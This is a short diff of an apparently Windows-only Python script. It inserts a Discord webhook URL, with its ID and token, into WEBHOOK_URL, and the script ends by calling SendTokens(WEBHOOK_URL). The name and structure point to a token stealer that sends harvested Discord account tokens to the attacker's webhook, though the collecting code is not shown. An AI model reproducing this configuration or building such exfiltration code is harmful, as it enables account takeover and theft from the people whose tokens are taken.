@@ -1,4 +1,4 @@
-WEBHOOK_URL = ''
+WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1414572160604962897/G3C2yLoyCgQh-VAeDePpXErqJQZeOIm3X9a92NxU5QIgEGzgweWK3gVqvo30R51idPxM'
 
 import os, json, re, urllib3, random
 if os.name != "nt": exit()
@@ -285,3 +285,4 @@ Language   = {language}'''
 
 
 SendTokens(WEBHOOK_URL)
+
